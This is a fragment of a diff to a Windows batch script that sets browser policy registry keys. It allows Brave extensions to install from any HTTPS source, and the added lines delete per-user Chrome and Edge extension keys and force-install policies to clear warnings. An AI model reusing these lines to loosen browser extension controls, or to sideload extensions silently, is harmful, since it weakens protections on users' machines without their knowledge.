@@ -45,10 +45,14 @@ reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallSources" /v 
 reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallSources" /v 3 /t REG_SZ /d "https://*/*" /f >nul
 echo [OK] Registered Brave Browser Enterprise Policy
 
-:: Remove external CRX keys if they exist in HKCU to clear out any disabled warning
+:: Remove external CRX keys and stale HKCU force-install policies
 reg delete "HKCU\Software\Google\Chrome\Extensions\%EXT_ID%" /f >nul 2>&1
 reg delete "HKCU\Software\Microsoft\Edge\Extensions\%EXT_ID%" /f >nul 2>&1
 reg delete "HKCU\Software\BraveSoftware\Brave\Extensions\%EXT_ID%" /f >nul 2>&1
+reg delete "HKCU\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /f >nul 2>&1
+reg delete "HKCU\SOFTWARE\Policies\Google\Chrome" /v ExtensionSettings /f >nul 2>&1
+reg delete "HKCU\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" /f >nul 2>&1
+reg delete "HKCU\SOFTWARE\Policies\Microsoft\Edge" /v ExtensionSettings /f >nul 2>&1
 
 echo.
 echo ============================================================
